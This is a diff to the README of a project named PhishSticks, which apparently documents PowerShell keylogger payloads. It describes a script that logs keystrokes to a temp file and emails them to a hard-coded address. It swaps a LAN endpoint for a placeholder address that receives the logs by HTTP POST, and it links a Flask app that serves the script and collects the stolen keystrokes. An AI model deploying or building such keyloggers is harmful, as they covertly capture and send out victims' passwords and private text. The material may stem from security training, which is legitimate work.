@@ -6,7 +6,7 @@
 
 **Two scripts:**   
  
-[helper_mail.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_mail.ps1) - **WIP, not fully tested for "production" at this point 3.11.23**
+[helper_mail.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_mail.ps1) - **DEPRECATED! and not even fully tested - 16.11.2023**
 - Logs key presses to a file `$env:temp\help.txt` 
 - Sends the file to an email address, assigned in the code.
 
@@ -57,5 +57,7 @@ $SMTPPort = "587"
 ```powershell
 $TimesToRun = 20                      	# How many times to run the script.
 $RunTimeP = 0.1                        	# Runtime in minutes for each run.
-$endpoint = "http://192.168.66.2/server"  # Address to send the file to.
+$endpoint = "ADDRESS_TO_POST_LOGS_TO"   # Address to send the file to.
 ```
+
+Check out our [simple Flask app](https://github.com/therealhalonen/PhishSticks/tree/master/scripts/webhook), to serve the script and receive the keylogs.
